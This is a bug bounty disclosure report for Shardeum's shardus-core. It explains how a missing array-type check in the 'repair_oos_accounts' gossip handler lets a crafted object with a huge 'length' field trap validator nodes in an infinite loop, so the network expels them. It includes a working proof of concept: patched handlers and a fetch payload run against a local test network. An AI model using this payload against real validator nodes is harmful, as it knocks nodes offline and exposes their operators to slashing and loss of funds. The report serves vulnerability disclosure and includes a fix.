# 33941 - \[BC - Critical] A missing check for the type of a variable allo...

Submitted on Aug 2nd 2024 at 11:11:29 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33941

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)
* Direct loss of funds

## Description

## Brief/Intro

In this report, we demonstrate how missing a check that ensures a user-controlled input is of type Array, allows for an attacker to send a maliciously crafted gossip message that unexpectedly disconnects active nodes from the network.

> Disconnecting nodes from the active set without allowing them to send or receive gossip messages during the process exposes them to a slashing mechanism, causing loss of funds to victim nodes.

An alternative attack vector is to disconnect all active nodes and any new node that joins the active set, except for malicious ones.

> Controlling all nodes in a cycle leads to a loss of funds by manipulating the outcome of any transaction.

## About The Attack Vector

> Before pointing out the vulnerable code, it is important to understand how the attack vector works and why. In this section, we explain it with easy-to-understand examples.

Take a look at the following javascript code:

```
// USER-CONTROLLED INPUT
let greetings = ["hi", "hey", "hello"]

// SERVER-SIDE CODE
for (let i = 0; i < greetings.length; i++) {

    if (greetings[i] === "hello") {
        // do something here...
    }

}
```

The variable `greetings` is user input and the developer is expecting the user to provide an array of greetings.

But *what can go wrong if we don't enforce the variable `greetings` to be of type array?*

A malicious user can supply an object instead of an array, containing a field `length` with a number big enough to brick any application that tries to loop that many times in a row:

```
// USER-CONTROLLED INPUT
let greetings = { "length": "10000000000000001" }

// SERVER-SIDE CODE
for (let i = 0; i < greetings.length; i++) {

    if (greetings[i] === "hello") {
        // do something here...
    }

}
```

Due to how math with large numbers works in Javascript, a length of "10000000000000001" is enough to cause an infinite loop and brick the application.

> In our report with ID `33745` we explain how the Javascript type "Number" loses precision when operating with large numbers such as `10000000000000000`, and how the result of adding `10000000000000000 + 1` in Javascript automatically rounds back to `10000000000000000` (stays the same), no matter how many times in a row you add +1 to it.
>
> For a quick test, open your browser console and send `10000000000000000 + 1`, you may expect the output to be `10000000000000001` but it will be `10000000000000000`.
>
> For more info about Javascript's Math Quirks check our report `33745`.

## Vulnerability Details

The vulnerable function is the handler for the internal gossip route `repair_oos_accounts`.

> <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L336-L487>

Its execution flow starts by looping from an array of **repairInstructions**, extracting an **accountID**, **txId**, **hash**, **accountData**, **targetNodeId** and **receipt2**, and finally processing those fields.

```
this.p2p.registerInternal(
  'repair_oos_accounts',
  async (
    payload: { repairInstructions: AccountRepairInstruction[] },
    respond: (arg0: boolean) => Promise<boolean>,
    _sender: unknown,
    _tracker: string,
    msgSize: number
  ) => {
    profilerInstance.scopedProfileSectionStart('repair_oos_accounts', false, msgSize)

    try {
      for (const repairInstruction of payload?.repairInstructions) {
        const { accountID, txId, hash, accountData, targetNodeId, receipt2 } = repairInstruction
```

> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L336-L349>

The only field relevant to our report is `payload .repairInstructions .receipt2 .appliedVote .account_id`which is expected to be an array, but is not enforced in the code with a check, allowing a malicious sender to pass a variable of any other type.

After running some validity checks on the rest of the fields - which we are not diving deep into because they are irrelevant for the exploit to work - the code loops using the `length` field of the `payload.repairInstructions.receipt2.appliedVote.account_id` variable.

```
for (let i = 0; i < receivedBestVote.account_id.length; i++) {

  if (receivedBestVote.account_id[i] === accountID) {

      // SOME CODE HERE

  }

}
```

> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L413-L422>

When sending an object instead of an array, with a field `length` and the value `10000000000000001`, it loops infinitely until the execution bricks, the validator stops responding to other nodes and is quicked out of the network.

## Recommended fix

Validate the type of the variable `account_id` to ensure it is an array.

## Impact Details

* All other endpoints (HTTP and Gossips) of the victim node become unresponsive. Visiting or requesting any of them will timeout.
* The rest of the nodes start to timeout their requests to the victim node and report him as lost, which may lead to a slashing event for becoming unresponsive without gossiping anything to the rest of the network.
* The victim node is removed from the network.
* It can be exploited to remove specific nodes and force them to be slashed or to remove as many nodes as possible to attempt to take over the active validators set.

## Proof of Concept

Download locally Shardus Core repo and Shardeum's repo locally.

Apply the following patch to the Shardeum repo:

```
git apply debug-10-nodes.patch
```

Now point Shardeum to use the local copy of Shardu's Core as instructed in the README.md file of Shardeum's codebase.

In your local copy of Shardeum, open the file `./src/index.ts` and add the following function in line L1094 (<https://github.com/shardeum/shardeum/blob/dev/src/index.ts#L1094>)

```
  shardus.registerExternalPost('infosec_gossipAnything/', externalApiMiddleware, async (req, res) => {
    try {
      const obj = JSON.parse(JSON.stringify(req.body));

      const route = req.query.route as string;

      const pk = req.query.pk as string;
      let node = shardus.getNodeByPubKey(pk);

      console.log(`INFOSEC: sending to node: ${JSON.stringify({ node })}`);
      await shardus.p2p.tell([node], route, obj, true, '')

      return res.json({ "ok": 1 });
    } catch (e) {
      return res.json({ "error": e });
    }
  });
```

The code snippet above creates an HTTP POST entry point that allows us to instruct a malicious node to gossip any message using any desired route to another node.

In your local copy of Shardus Core, open the file `./src/state-manager/AccountPatcher.ts` and add the following function in line L335 (<https://github.com/shardeum/shardus-core/blob/dev/src/state-manager/AccountPatcher.ts#L335>)

```
    this.p2p.registerInternal(
      'infosec_repair_oos_accounts',
      async (
        payload: { repairInstructions: AccountRepairInstruction[] },
        respond: (arg0: boolean) => Promise<boolean>,
        _sender: unknown,
        _tracker: string,
        msgSize: number
      ) => {
        profilerInstance.scopedProfileSectionStart('repair_oos_accounts', false, msgSize)

        try {
          for (const repairInstruction of payload?.repairInstructions) {
            const { accountID, txId, hash, accountData, targetNodeId, receipt2 } = repairInstruction

            // check if we are the target node
            //if (targetNodeId !== Self.id) {
            //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: not target node for txId: ${txId}`)
            //  continue
            //}

            // check if we cover this accountId
            //const storageNodes = this.stateManager.transactionQueue.getStorageGroupForAccount(accountID)
            //const isInStorageGroup = storageNodes.map((node) => node.id).includes(Self.id)
            //if (!isInStorageGroup) {
            //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: not in storage group for account: ${accountID}`)
            //  continue
            //}
            // check if we have already repaired this account
            //const accountHashCache = this.stateManager.accountCache.getAccountHash(accountID)
            //if (accountHashCache != null && accountHashCache.h === hash) {
            //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: already repaired account: ${accountID}`)
            //  continue
            //}
            //if (accountHashCache != null && accountHashCache.t > accountData.timestamp) {
            //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: we have newer account: ${accountID}`)
            //  continue
            //}

            //const archivedQueueEntry = this.stateManager.transactionQueue.getQueueEntryArchived(txId, 'repair_oos_accounts')

            //if (archivedQueueEntry == null) {
            //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: no archivedQueueEntry for txId: ${txId}`)
            //  this.mainLogger.debug(`repair_oos_accounts: no archivedQueueEntry for txId: ${txId}`)
            //  continue
            //}

            // check the vote and confirmation status of the tx
            //const bestMessage = receipt2.confirmOrChallenge
            const receivedBestVote = receipt2.appliedVote

            if (receivedBestVote != null) {
              // Check if vote is from eligible list of voters for this TX
              //if (this.stateManager.transactionQueue.useNewPOQ && !archivedQueueEntry.eligibleNodeIdsToVote.has(receivedBestVote.node_id)) {
              //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: vote from ineligible node for txId: ${txId}`)
              //  continue
              //}

              // Check signature of the vote
              //if (!this.crypto.verify(
              //  receivedBestVote as SignedObject,
              //  archivedQueueEntry.executionGroupMap.get(receivedBestVote.node_id).publicKey
              //)) {
              //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: vote signature invalid for txId: ${txId}`)
              //  continue
              //}

              // Check transaction result from vote
              //if (!receivedBestVote.transaction_result) {
              //  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: vote result not true for txId ${txId}`)
              //  continue
              //}

              // Check account hash. Calculate account hash of account given in instruction
              // and compare it with the account hash in the vote.
              //const calculatedAccountHash = this.app.calculateAccountHash(accountData.data)
              let accountHashMatch = false
              // HACK: Infinite loop
              for (let i = 0; i < receivedBestVote.account_id.length; i++) {
                if (receivedBestVote.account_id[i] === accountID) {
                  /*
                  if (receivedBestVote.account_state_hash_after[i] !== calculatedAccountHash) {
                    nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: account hash mismatch for txId: ${txId}`)
                    accountHashMatch = false
                  } else {
                    accountHashMatch = true
                  }
                  */
                  break
                }
              }
              if (accountHashMatch === false) {
                nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: vote account hash mismatch for txId: ${txId}`)
                continue
              }
            } else {
              // Skip this account apply as we were not able to get the best vote for this tx
              nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: no vote for txId: ${txId}`)
              continue
            }

            /*
            if (this.stateManager.transactionQueue.useNewPOQ) {
              if (bestMessage != null) {
                // Skip if challenge receipt
                if (bestMessage.message === 'challenge') {
                  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: challenge for txId: ${txId}`)
                  continue
                }

                // Check if mesasge is from eligible list of responders for this TX
                if (!archivedQueueEntry.eligibleNodeIdsToConfirm.has(bestMessage.nodeId)) {
                  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: confirmation from ineligible node for txId: ${txId}`)
                  continue
                }

                // Check signature of the message
                if (!this.crypto.verify(
                  bestMessage as SignedObject,
                  archivedQueueEntry.executionGroupMap.get(bestMessage.nodeId).publicKey
                )) {
                  nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: confirmation signature invalid for txId: ${txId}`)
                  continue
                }
              } else {
                // Skip this account apply as we were not able to get the best confirmation for this tx
                nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts: no confirmation for txId: ${txId}`)
                continue
              }
            }

            // update the account data (and cache?)
            const updatedAccounts: string[] = []
            //save the account data.  note this will make sure account hashes match the wrappers and return failed
            // hashes  that don't match
            const failedHashes = await this.stateManager.checkAndSetAccountData(
              [accountData],
              `repair_oos_accounts:${txId}`,
              true,
              updatedAccounts
            )
            if (logFlags.debug) this.mainLogger.debug(`repair_oos_accounts: ${updatedAccounts.length} updated, ${failedHashes.length} failed`)
            nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts:${updatedAccounts.length} updated, accountId: ${utils.makeShortHash(accountID)}, cycle: ${this.stateManager.currentCycleShardData.cycleNumber}`)
            if (failedHashes.length > 0) nestedCountersInstance.countEvent('accountPatcher', `repair_oos_accounts:${failedHashes.length} failed`)
            let success = false
            if (updatedAccounts.length > 0 && failedHashes.length === 0) {
              success = true
            }
            */
          }
          await respond(true)
        } catch (e) {
        }

        profilerInstance.scopedProfileSectionEnd('repair_oos_accounts')
      }
    )
```

The code snippet above does the following:

**1-** It creates a copy of the internal gossip handler `repair_oos_accounts` and names it `infosec_repair_oos_accounts`.

**2-** The `account_id` is the only value we'll tamper with. The rest of the fields in the payload will be untampered (valid values, that a legit request would send). Therefore, we make the proof of concept way easier to setup and reproduce by creating a new gossip handler and commenting checks for fields that will not be tampered with, but leaving uncommented all code that touches the vulnerable field.

Now build both codebases, and start the network with 10 nodes using shardus's CLI (`shardus start 10`)

Wait until cycle 16 before proceeding with the next step. All nodes should be active and synced by cycle 16.

> You can check the current cycle number in the network monitor: <http://SERVER\\_IP:3000>

After cycle 16, visit: <http://SERVER\\_IP:4000/nodelist> and copy the public key of the node running at port 9003. He will be our victim.

Now, visit: <http://SERVER\\_IP:9005/>, the node running at port 9005 will be the malicious one.

Open the browser console, and send the following request, after modifying the placeholders `SERVER_IP` and `VICTIM_PUBLIC_KEY` :

```
fetch("http://SERVER_IP:9005/infosec_gossipAnything/?route=infosec_repair_oos_accounts&pk=VICTIM_PUBLIC_KEY", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "repairInstructions": [{
            "accountID": "placeholder",
            "txId": "placeholder",
            "hash": "placeholder",
            "accountData": {},
            "targetNodeId": "placeholder",
            "receipt2": {
                "confirmOrChallenge": "placeholder",
                "appliedVote": {
                    "transaction_result": "placeholder",
                    "account_id": {
                        "length": "10000000000000000001"
                    }
                }
            }
        }]
    })
}).then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok');
    }
    return response.json();
}).then(data => {
    console.log('Success:', data);
}).catch(error => {
    console.error('Error:', error);
});
```

After sending the payload, you can try to visit <http://SERVER\\_IP:VICTIM\\_PORT/> and it will not load.

At this point, the victim node is bricked. Other nodes will try to reach out to him using the **P2P: askBinary: network.askBinary: route: binary/compare\_cert request** but they will get no response, leading to the victim's expulsion from the network.

This can be verified by going to the network monitor after waiting a couple of minutes <http://SERVER\\_IP:3000>, the victim node won't be there. If the network was started with 10 nodes, the total displayed in the dashboard will be 9.
